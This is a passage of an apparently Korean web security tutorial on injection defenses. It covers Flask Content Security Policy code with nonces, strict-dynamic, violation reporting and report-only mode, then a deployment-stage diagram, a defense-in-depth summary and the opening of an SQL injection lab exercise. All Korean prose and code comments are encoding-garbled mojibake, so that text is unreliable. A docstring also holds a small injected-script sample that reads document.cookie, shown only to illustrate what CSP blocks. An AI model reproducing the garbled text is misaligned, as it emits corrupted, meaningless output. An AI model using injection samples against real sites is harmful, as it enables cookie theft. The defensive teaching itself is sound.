â”‚<span class="w">  </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">       </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="82-csp">8.2 CSP êµ¬í˜„<a class="header-link" href="#82-csp" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">csp_implementation.py - Flaskìš© Content Security Policy</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">g</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë ˆë²¨ 1: ê¸°ë³¸ CSP (ì¢‹ì€ ì‹œì‘ì )</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_basic</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ëŒ€ë¶€ë¶„ì˜ XSSë¥¼ ì°¨ë‹¨í•˜ëŠ” ê¸°ë³¸ CSP.&quot;&quot;&quot;</span>
    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>          <span class="c1"># ë™ì¼ ì¶œì²˜ì—ì„œë§Œ ë¡œë“œ</span>
        <span class="s2">&quot;script-src &#39;self&#39;; &quot;</span>           <span class="c1"># ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ ì—†ìŒ!</span>
        <span class="s2">&quot;style-src &#39;self&#39;; &quot;</span>            <span class="c1"># ì¸ë¼ì¸ ìŠ¤íƒ€ì¼ ì—†ìŒ!</span>
        <span class="s2">&quot;img-src &#39;self&#39; data:; &quot;</span>        <span class="c1"># ì´ë¯¸ì§€ìš© data: URI í—ˆìš©</span>
        <span class="s2">&quot;font-src &#39;self&#39;; &quot;</span>
        <span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>           <span class="c1"># Flash/Java í”ŒëŸ¬ê·¸ì¸ ì—†ìŒ</span>
        <span class="s2">&quot;frame-ancestors &#39;none&#39;; &quot;</span>      <span class="c1"># iframeì— í¬í•¨ ë¶ˆê°€</span>
        <span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>             <span class="c1"># &lt;base&gt; í•˜ì´ì¬í‚¹ ë°©ì§€</span>
        <span class="s2">&quot;form-action &#39;self&#39;&quot;</span>            <span class="c1"># í¼ì€ ìì‹ ì—ê²Œë§Œ ì œì¶œ</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë ˆë²¨ 2: nonceê°€ ìˆëŠ” CSP (í•„ìš”í•  ë•Œ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ìš©)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">before_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">generate_csp_nonce</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ê° ìš”ì²­ì— ëŒ€í•´ ê³ ìœ í•œ nonce ìƒì„±.&quot;&quot;&quot;</span>
    <span class="n">g</span><span class="o">.</span><span class="n">csp_nonce</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_nonce</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;nonce ê¸°ë°˜ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ í—ˆìš© ëª©ë¡ì´ ìˆëŠ” CSP.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>  <span class="c1"># ì´ nonceê°€ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ë§Œ</span>
        <span class="sa">f</span><span class="s2">&quot;style-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;img-src &#39;self&#39; data: https:; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;font-src &#39;self&#39; https://fonts.gstatic.com; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;connect-src &#39;self&#39; https://api.example.com; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;frame-ancestors &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;form-action &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># í…œí”Œë¦¿ì—ì„œ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ì— nonce ì‚¬ìš©:</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">&lt;!-- ì´ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì˜¬ë°”ë¥¸ nonceê°€ ìˆìœ¼ë¯€ë¡œ í—ˆìš©ë¨ --&gt;</span>
<span class="sd">&lt;script nonce=&quot;{{ g.csp_nonce }}&quot;&gt;</span>
<span class="sd">    // ì •ìƒ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸</span>
<span class="sd">    document.getElementById(&#39;app&#39;).textContent = &#39;Hello&#39;;</span>
<span class="sd">&lt;/script&gt;</span>

<span class="sd">&lt;!-- ì´ ì£¼ì…ëœ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì°¨ë‹¨ë¨ (nonce ì—†ìŒ) --&gt;</span>
<span class="sd">&lt;script&gt;</span>
<span class="sd">    // XSS í˜ì´ë¡œë“œ - CSPì— ì˜í•´ ì°¨ë‹¨!</span>
<span class="sd">    document.cookie;</span>
<span class="sd">&lt;/script&gt;</span>
<span class="sd">&quot;&quot;&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë ˆë²¨ 3: Strict CSP (Google ê¶Œì¥)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_strict</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Google ê¶Œì¥ ì‚¬í•­ ê¸°ë°˜ Strict CSP.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="c1"># strict-dynamic: ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ì— ì˜í•´ ë¡œë“œëœ ìŠ¤í¬ë¦½íŠ¸ ì‹ ë¢°</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39; &#39;strict-dynamic&#39; https:; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>
        <span class="c1"># ìœ„ë°˜ ë³´ê³ </span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># CSP ìœ„ë°˜ ë³´ê³ </span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/csp-report&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">csp_report</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CSP ìœ„ë°˜ ë³´ê³ ì„œ ìˆ˜ì‹ .&quot;&quot;&quot;</span>
    <span class="n">report</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">violation</span> <span class="o">=</span> <span class="n">report</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csp-report&#39;</span><span class="p">,</span> <span class="p">{})</span>

    <span class="n">app</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;CSP Violation: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;violated-directive&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;blocked: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;blocked-uri&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;page: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;document-uri&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="p">)</span>

    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">204</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Report-Only ëª¨ë“œ (ì‹œí–‰ ì „ í…ŒìŠ¤íŠ¸ìš©)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_report_only</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CSPë¥¼ ì•„ë¬´ê²ƒë„ ì°¨ë‹¨í•˜ì§€ ì•Šê³  í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ Report-Only ì‚¬ìš©.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Content-Security-Policy-Report-Only: ë¡œê·¸ë§Œ ê¸°ë¡í•˜ê³  ì°¨ë‹¨í•˜ì§€ ì•ŠìŒ</span>
    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy-Report-Only&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>
</code></pre></div>

<h3 id="83-csp">8.3 CSP ë°°í¬ ì „ëµ<a class="header-link" href="#83-csp" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              CSP ë°°í¬ ë‹¨ê³„                                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  ë‹¨ê³„ 1: Report-Only ëª¨ë“œ                                        â”‚
â”‚  Content-Security-Policy-Report-Only í—¤ë”ë¡œ ë°°í¬                 â”‚
â”‚  1-2ì£¼ ë™ì•ˆ ìœ„ë°˜ ë³´ê³ ì„œ ëª¨ë‹ˆí„°ë§                                 â”‚
â”‚  ì°¨ë‹¨ë  ì •ìƒ ë¦¬ì†ŒìŠ¤ ìˆ˜ì •                                         â”‚
â”‚                                                                  â”‚
â”‚  ë‹¨ê³„ 2: ê¸°ë³¸ ì‹œí–‰                                               â”‚
â”‚  Content-Security-Policy í—¤ë”ë¡œ ì „í™˜                             â”‚
â”‚  í—ˆìš©ì ì¸ ì •ì±…ìœ¼ë¡œ ì‹œì‘, ì ì§„ì ìœ¼ë¡œ ê°•í™”                         â”‚
â”‚  ë¬¸ì œë¥¼ í¬ì°©í•˜ê¸° ìœ„í•´ report-uri ìœ ì§€                            â”‚
â”‚                                                                  â”‚
â”‚  ë‹¨ê³„ 3: ì—„ê²©í•œ ì‹œí–‰                                             â”‚
â”‚  &#39;unsafe-inline&#39; ì œê±° (ëŒ€ì‹  nonce ì‚¬ìš©)                         â”‚
â”‚  &#39;unsafe-eval&#39; ì œê±°                                             â”‚
â”‚  ìŠ¤í¬ë¦½íŠ¸ ë¡œë“œë¥¼ ìœ„í•´ &#39;strict-dynamic&#39; ì¶”ê°€                      â”‚
â”‚  í—ˆìš©ëœ ë„ë©”ì¸ ìµœì†Œí™”                                            â”‚
â”‚                                                                  â”‚
â”‚  ë‹¨ê³„ 4: ìœ ì§€ë³´ìˆ˜                                                â”‚
â”‚  CSP ë³´ê³ ì„œ ì •ê¸°ì ìœ¼ë¡œ ê²€í†                                       â”‚
â”‚  ì• í”Œë¦¬ì¼€ì´ì…˜ ë°œì „ì— ë”°ë¼ ì •ì±… ì—…ë°ì´íŠ¸                          â”‚
â”‚  ìŠ¤í…Œì´ì§•ì—ì„œ ë¨¼ì € CSP ë³€ê²½ ì‚¬í•­ í…ŒìŠ¤íŠ¸                          â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<hr />
<h2 id="9">9. ì‹¬ì¸µ ë°©ì–´ ìš”ì•½<a class="header-link" href="#9" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="nt">ì¸ì ì…˜ì—</span><span class="w"> </span><span class="nt">ëŒ€í•œ</span><span class="w"> </span><span class="nt">ì‹¬ì¸µ</span><span class="w"> </span><span class="nt">ë°©ì–´</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ê³„ì¸µ</span><span class="w"> </span><span class="nt">1</span><span class="o">:</span><span class="w"> </span><span class="nt">ì…ë ¥</span><span class="w"> </span><span class="nt">ê²€ì¦</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸</span><span class="w"> </span><span class="nt">ê²€ì¦</span><span class="w"> </span><span class="o">(</span><span class="nt">ë¸”ë™ë¦¬ìŠ¤íŠ¸ë³´ë‹¤</span><span class="w"> </span><span class="nt">ì„ í˜¸</span><span class="o">)</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">íƒ€ì…</span><span class="w"> </span><span class="nt">ê²€ì‚¬</span><span class="w"> </span><span class="o">(</span><span class="nt">int</span><span class="o">,</span><span class="w"> </span><span class="nt">email</span><span class="o">,</span><span class="w"> </span><span class="nt">URL</span><span class="w"> </span><span class="nt">í˜•ì‹</span><span class="o">)</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">ê¸¸ì´</span><span class="w"> </span><span class="nt">ì œí•œ</span><span class="w">                                                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">ë¬¸ì</span><span class="w"> </span><span class="nt">ì§‘í•©</span><span class="w"> </span><span class="nt">ì œí•œ</span><span class="w">                                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ê³„ì¸µ</span><span class="w"> </span><span class="nt">2</span><span class="o">:</span><span class="w"> </span><span class="nt">ë§¤ê°œë³€ìˆ˜í™”</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">ì•ˆì „í•œ</span><span class="w"> </span><span class="nt">API</span><span class="w">                                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">ë§¤ê°œë³€ìˆ˜í™”ëœ</span><span class="w"> </span><span class="nt">ì¿¼ë¦¬</span><span class="w"> </span><span class="o">(</span><span class="nt">SQL</span><span class="o">)</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">í…œí”Œë¦¿</span><span class="w"> </span><span class="nt">ë°ì´í„°</span><span class="w"> </span><span class="nt">ë§¤ê°œë³€ìˆ˜</span><span class="w"> </span><span class="o">(</span><span class="nt">SSTI</span><span class="o">)</span><span class="w">                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">ë¦¬ìŠ¤íŠ¸</span><span class="w"> </span><span class="nt">ì¸ìˆ˜ë¡œ</span><span class="w"> </span><span class="nt">subprocess</span><span class="w"> </span><span class="o">(</span><span class="nt">Command</span><span class="o">)</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">LDAP</span><span class="w"> </span><span class="nt">ì´ìŠ¤ì¼€ì´í”„</span><span class="w"> </span><span class="nt">í•¨ìˆ˜</span><span class="w"> </span><span class="o">(</span><span class="nt">LDAP</span><span class="o">)</span><span class="w">                                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ê³„ì¸µ</span><span class="w"> </span><span class="nt">3</span><span class="o">:</span><span class="w"> </span><span class="nt">ì¶œë ¥</span><span class="w"> </span><span class="nt">ì¸ì½”ë”©</span><span class="w">                                             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">HTML</span><span class="w"> </span><span class="nt">ì—”í‹°í‹°</span><span class="w"> </span><span class="nt">ì¸ì½”ë”©</span><span class="w"> </span><span class="o">(</span><span class="nt">HTML</span><span class="w"> </span><span class="nt">ì»¨í…ìŠ¤íŠ¸ì˜</span><span class="w"> </span><span class="nt">XSS</span><span class="o">)</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">JavaScript</span><span class="w"> </span><span class="nt">ì¸ì½”ë”©</span><span class="w"> </span><span class="o">(</span><span class="nt">JS</span><span class="w"> </span><span class="nt">ì»¨í…ìŠ¤íŠ¸ì˜</span><span class="w"> </span><span class="nt">XSS</span><span class="o">)</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">URL</span><span class="w"> </span><span class="nt">ì¸ì½”ë”©</span><span class="w"> </span><span class="o">(</span><span class="nt">URL</span><span class="w"> </span><span class="nt">ì»¨í…ìŠ¤íŠ¸ì˜</span><span class="w"> </span><span class="nt">XSS</span><span class="o">)</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">ê°</span><span class="w"> </span><span class="nt">ì¶œë ¥ì—</span><span class="w"> </span><span class="nt">ëŒ€í•œ</span><span class="w"> </span><span class="nt">ì»¨í…ìŠ¤íŠ¸ë³„</span><span class="w"> </span><span class="nt">ì¸ì½”ë”©</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ê³„ì¸µ</span><span class="w"> </span><span class="nt">4</span><span class="o">:</span><span class="w"> </span><span class="nt">ë³´ì•ˆ</span><span class="w"> </span><span class="nt">í—¤ë”</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Content-Security-Policy</span><span class="w"> </span><span class="o">(</span><span class="nt">ì¸ë¼ì¸</span><span class="w"> </span><span class="nt">ìŠ¤í¬ë¦½íŠ¸</span><span class="w"> </span><span class="nt">ì°¨ë‹¨</span><span class="o">)</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">X-Content-Type-Options</span><span class="o">:</span><span class="w"> </span><span class="nt">nosniff</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">X-Frame-Options</span><span class="o">:</span><span class="w"> </span><span class="nt">DENY</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">Set-Cookie</span><span class="o">:</span><span class="w"> </span><span class="nt">HttpOnly</span><span class="o">;</span><span class="w"> </span><span class="nt">Secure</span><span class="o">;</span><span class="w"> </span><span class="nt">SameSite</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ê³„ì¸µ</span><span class="w"> </span><span class="nt">5</span><span class="o">:</span><span class="w"> </span><span class="nt">ëŸ°íƒ€ì„</span><span class="w"> </span><span class="nt">ë³´í˜¸</span><span class="w">                                             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Web</span><span class="w"> </span><span class="nt">Application</span><span class="w"> </span><span class="nt">Firewall</span><span class="w"> </span><span class="o">(</span><span class="nt">WAF</span><span class="o">)</span><span class="w">                             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">ì†ë„</span><span class="w"> </span><span class="nt">ì œí•œ</span><span class="w">                                                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">ì´ìƒ</span><span class="w"> </span><span class="nt">íƒì§€</span><span class="w">                                                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">ë³´ì•ˆ</span><span class="w"> </span><span class="nt">ëª¨ë‹ˆí„°ë§</span><span class="w"> </span><span class="nt">ë°</span><span class="w"> </span><span class="nt">ê²½ê³ </span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ë‹¨ì¼</span><span class="w"> </span><span class="nt">ê³„ì¸µìœ¼ë¡œëŠ”</span><span class="w"> </span><span class="nt">ì¶©ë¶„í•˜ì§€</span><span class="w"> </span><span class="nt">ì•ŠìŒ</span><span class="o">.</span><span class="w"> </span><span class="nt">ëª¨ë“ </span><span class="w"> </span><span class="nt">ê³„ì¸µì„</span><span class="w"> </span><span class="nt">í•¨ê»˜</span><span class="w"> </span><span class="nt">ì‚¬ìš©</span><span class="o">.</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="10">10. ì—°ìŠµ ë¬¸ì œ<a class="header-link" href="#10" title="Permanent link">&para;</a></h2>
<h3 id="1-sql-injection">ì—°ìŠµ ë¬¸ì œ 1: SQL Injection ë©<a class="header-link" href="#1-sql-injection" title="Permanent link">&para;</a></h3>
<p>ì¸ì ì…˜ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³ , ì•…ìš© í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•œ í›„ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ì„¸ìš”:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ì—°ìŠµ ë¬¸ì œ: SQL injectionì„ ì°¾ê³ , ì•…ìš©í•œ í›„ ìˆ˜ì •í•˜ì„¸ìš”.</span>
<span class="sd">&quot;&quot;&quot;</span>
